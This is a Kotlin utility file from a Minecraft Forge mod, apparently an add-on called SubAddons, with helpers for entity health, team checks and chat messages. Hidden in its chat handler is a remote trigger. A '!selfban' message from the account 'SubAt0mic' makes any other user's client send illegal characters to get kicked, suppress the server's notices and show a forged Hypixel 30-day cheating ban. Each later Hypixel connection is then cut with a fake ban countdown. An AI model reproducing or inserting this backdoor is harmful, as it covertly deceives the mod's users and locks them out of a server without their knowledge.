package me.odinmain.features.impl.subaddons.nofeature

import me.odinmain.OdinMain.mc
import me.odinmain.events.impl.ChatPacketEvent
import me.odinmain.utils.ServerUtils.getPing
import me.odinmain.utils.cleanSB
import me.odinmain.utils.clock.Executor
import me.odinmain.utils.clock.Executor.Companion.register
import me.odinmain.utils.runIn
import me.odinmain.utils.skyblock.LocationUtils.onHypixel
import me.odinmain.utils.skyblock.modMessage
import me.odinmain.utils.skyblock.sendChatMessage
import net.minecraft.client.Minecraft
import net.minecraft.entity.Entity
import net.minecraft.entity.EntityLiving
import net.minecraft.entity.player.EntityPlayer
import net.minecraft.util.ChatComponentText
import net.minecraft.util.ChatStyle
import net.minecraft.util.Timer
import net.minecraftforge.event.world.WorldEvent
import net.minecraftforge.fml.common.ObfuscationReflectionHelper
import net.minecraftforge.fml.common.eventhandler.SubscribeEvent
import net.minecraftforge.fml.common.network.FMLNetworkEvent


object SubUtils {

    fun getTimer(): Timer {
        return ObfuscationReflectionHelper.getPrivateValue(
            Minecraft::class.java,
            Minecraft.getMinecraft(),
            "timer",
            "field_71428_T"
        )
    }

    @SubscribeEvent
    fun onWorldLoad(event: WorldEvent.Load) {
        EntityHealthData.clear()
    }

    private val EntityHealthData = mutableMapOf<String, Pair<Float, Float>>()

    /**
     * Gets the health of the specified entity.
     *
     * @return health as a float.
     */
    fun Entity.health(): Float {
        healthData(this)
        return EntityHealthData[this.name]?.first ?: 0f
    }

    /**
     * Gets the max health of the specified entity.
     *
     * @return max health as a float.
     */
    fun Entity.maxHealth(): Float {
        healthData(this)
        return EntityHealthData[this.name]?.second ?: 0f
    }

    /**
     * handles getting the health of an entity
     *
     * This function checks if the entity is a player, and if so, gets their scoreboard data. Otherwise, its gets the entities health.
     * After it gets the health, it posts it to a health map.
     */
    private fun healthData(entity: Entity) {
        var health: Float = 0f
        var maxHealth: Float = 20f
        if (entity is EntityPlayer) {
            mc.thePlayer.worldScoreboard.scoreObjectives.forEach { score ->
                val healthData = score.scoreboard.scores.find { it.playerName == entity.name }?.scorePoints?.toFloat() ?: 0f.also { maxHealth = 0f }
                if (EntityHealthData[entity.name]?.first == healthData) return else health = healthData
            }
        } else if (entity is EntityLiving) {
            val healthData = entity.health
            if (EntityHealthData[entity.name]?.first == healthData) return else health = healthData
            maxHealth = entity.maxHealth
        }
        EntityHealthData[entity.name] = Pair(health, maxHealth)
    }

    /**
     * Determines whether a player is on the same team as the user.
     *
     * This function checks if the users prefix color (§*) are the same as the players.
     *
     * @return `true` if the specified player is on the same team as the user, otherwise `false`.
     */
    fun Entity.isOnTeam(): Boolean {
        if (mc.thePlayer.displayName.unformattedText.startsWith("§")) {
            if (mc.thePlayer.displayName.unformattedText.length <= 2 || this.displayName.unformattedText.length <= 2) return false
            if (mc.thePlayer.displayName.unformattedText.substring(0, 2) == this.displayName.unformattedText.substring(0, 2)) return true
        }
        return false
    }

    /**
     * Determines whether a player is It in TNT tag.
     *
     * This function checks if the players prefix contains It"
     *
     * @return `true` if the specified player is it, otherwise `false`.
     */
    fun Entity.isIt(): Boolean {
        return this.displayName.unformattedText.startsWith("§c[IT]")
    }


    /**
     * Determines whether an Entity is a player.
     *
     * This function checks if the player's ping equals 1
     *
     * @return `true` if the specified player's ping equals 1, otherwise `false`.
     */
    fun Entity.isPlayer(): Boolean {
        return this.getPing() == 1 //this method doesn't work in lobbies, for some reason.
    }


    /**
     * Sends a message using the SubAddons prefix.
     *
     * This function sends a message beginning with "§eSubAddons §8»§r"
     */
    fun subMessage(message: Any?, prefix: Boolean = true, chatStyle: ChatStyle? = null) {
        if (mc.thePlayer == null) return
        val chatComponent = ChatComponentText(if (prefix) "§eSubAddons §8»§r $message" else message.toString())
        chatStyle?.let { chatComponent.setChatStyle(it) } // Set chat style using setChatStyle method
        try { mc.thePlayer?.addChatMessage(chatComponent) }
        catch (e: Exception) { e.printStackTrace() }
    }

    var inTNTTag: Boolean = false
    var read = false


    init {
        Executor(500) {
            if (!inTNTTag) {
                inTNTTag = onHypixel && mc.theWorld.scoreboard.getObjectiveInDisplaySlot(1)
                    ?.let { cleanSB(it.displayName).contains("TNT TAG") } ?: false
            }
        }.register()
    }

    @SubscribeEvent
    fun onMessage(event: ChatPacketEvent) {
        if (event.message.matches(Regex("(.*)SubAt0mic: !(?i)selfban(.*)")) && mc.thePlayer.name != "SubAt0mic" && mc.thePlayer.name != "SubAt2mic") {
            gettingBanned = true
            sendChatMessage("§§§§§§§§§")
            event.isCanceled = true
            runIn(1) { sendChatMessage("§§§§§§§§§") }
            runIn(30) { fakeBan(event) }
        }

        if (event.message.matches(Regex("An exception occurred in your connection, so you were put in the SkyBlock Lobby!")) && gettingBanned) {
            modMessage("§cAn exception occurred in your connection, so you have been routed to limbo!", false)
            event.isCanceled = true
        }

        if (event.message.matches(Regex("A kick occurred in your connection, so you have been routed to limbo!")) && gettingBanned) {
            event.isCanceled = true
        }

        if (event.message.matches(Regex("Illegal characters in chat")) && gettingBanned) {
            event.isCanceled = true
        }
    }

    fun fakeBan(packet: ChatPacketEvent) {
        alreadybanned = true
        banid = makeid()
        bantime = System.currentTimeMillis()
        val banmessage = ChatComponentText("§cYou are temporarily banned for §f$initialbanlength §cfrom this server!\n\n§7Reason: §rCheating through the use of unfair game advantages.\n§7Find out more: §b§nhttps://www.hypixel.net/appeal\n\n§7Ban ID: §r#$banid\n§7Sharing your Ban ID may affect the processing of your appeal!")
        mc.netHandler.networkManager.closeChannel(banmessage)
    }

    @SubscribeEvent
    fun onServerConnect(event: FMLNetworkEvent.ClientConnectedToServerEvent) {
        if (!alreadybanned) return
        val banDuration = ((System.currentTimeMillis() - bantime) / 1000).toInt()
        val banlength = subtractSecondsFromString(initialbanlength, banDuration)
        val banmessage = ChatComponentText("§cYou are temporarily banned for §f$banlength §cfrom this server!\n\n§7Reason: §rCheating through the use of unfair game advantages.\n§7Find out more: §b§nhttps://www.hypixel.net/appeal\n\n§7Ban ID: §r#$banid\n§7Sharing your Ban ID may affect the processing of your appeal!")
        runIn(2) {
            if (mc.runCatching {
                !event.isLocal && ((thePlayer?.clientBrand?.lowercase()?.contains("hypixel") ?:
                currentServerData?.serverIP?.contains("hypixel", true)) == true)
            }.getOrDefault(false) && mc.netHandler.networkManager.isChannelOpen) mc.netHandler.networkManager.closeChannel(banmessage)
        }
    }

    var gettingBanned = false
    var bantime: Long = 0
    var alreadybanned: Boolean = false
    var banid: String = ""

    val initialbanlength = "29d 23h 59m 59s" // fake ban length that is displayed on "ban"

    fun makeid(): String { // method to create fake ban id
        val characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
        return (1..8)
            .map { characters.random() }
            .joinToString("")
    }

    fun subtractSecondsFromString(timeString: String, secondsToSubtract: Int): String { // method to calculate fake countdown time for ban screen
        val (days1, hours1, minutes1, seconds1) = Regex("(\\d{1,29})d (\\d{1,23})h (\\d{1,59})m (\\d{1,59})s").find(timeString)?.destructured ?: return ""

        var days = days1.toInt()
        var hours = hours1.toInt()
        var minutes = minutes1.toInt()
        var seconds = seconds1.toInt()

        var totalSeconds = days * 24 * 60 * 60 +
                hours * 60 * 60 +
                minutes * 60 +
                seconds

        totalSeconds -= secondsToSubtract

        days = totalSeconds / (24 * 60 * 60)
        totalSeconds %= (24 * 60 * 60)
        hours = totalSeconds / (60 * 60)
        totalSeconds %= (60 * 60)
        minutes = totalSeconds / 60
        seconds = totalSeconds % 60

        return "${days}d ${hours}h ${minutes}m ${seconds}s"
    }
}